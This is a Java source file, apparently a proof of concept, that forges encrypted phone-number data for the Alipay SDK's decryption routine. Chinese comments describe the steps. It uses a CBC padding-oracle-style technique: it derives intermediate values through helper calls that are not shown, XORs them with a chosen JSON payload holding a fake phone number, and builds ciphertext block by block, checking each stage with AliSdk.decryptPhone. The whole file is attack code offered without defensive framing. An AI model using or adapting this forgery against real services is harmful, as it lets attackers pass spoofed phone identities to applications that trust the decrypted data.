import com.alipay.api.internal.util.codec.Base64;

import java.util.Arrays;

public class AliDecrupyContent {

    public static void main(String[] args)  throws Exception{
        //# 伪造密文。
        // 先计算出mvi
        // mvi xor 要伪造的密文 得到 伪造的vi、
        //
        byte[] mvi; // 中间值
        String targetPlainText = "{\"phoneNumber\": \"13580006666\",\"purePhoneNumber\": \"13580006666\",\"countryCode\": \"\",\"watermark\":{\"appid\":\"\",\"timestamp\": 1}}";
        byte[] targetPlainByteAndPadding = Util.paddingPlainText(targetPlainText);
        Util.printByteArray("targetPlainByteAndPadding", targetPlainByteAndPadding);
        System.out.println(new String(targetPlainByteAndPadding));
        byte[] cipherTextBlock = Util.initIv(); // 初始密文， 应该是随机密文都行
        int cbcBlackNum = targetPlainByteAndPadding.length/16;
        byte[] targetCipherText = cipherTextBlock;
        byte[] targetCipherBlock;
        byte[] encryptedTextBlock = new byte[16];

        for(int i= cbcBlackNum; i > 0; i--) {
            targetCipherBlock = Arrays.copyOfRange(targetPlainByteAndPadding, (i - 1) * 16, i * 16);
            Util.printByteArray("targetCipherBlock", targetCipherBlock);
            mvi = Util.getMvi(cipherTextBlock);
            for (int j = 0; j < 16; j++) encryptedTextBlock[j] = (byte) (targetCipherBlock[j] ^ mvi[j]);
            targetCipherText = Util.concat(encryptedTextBlock, targetCipherText);
            byte[] s2 = Base64.encodeBase64(targetCipherText);;
            String s3 = new String(s2);
            Util.printByteArray("targetCipherText", targetCipherText);
            System.out.println(AliSdk.decryptPhone(s3));
            cipherTextBlock = encryptedTextBlock;
        }
        Util.printByteArray("encryptedTextBlock", targetCipherText);
        byte[] sb = Base64.encodeBase64(targetCipherText);
        String targetCipher = new String(sb);
        System.out.println(targetCipher);
        System.out.println(AliSdk.decryptPhone(targetCipher));


    }
}
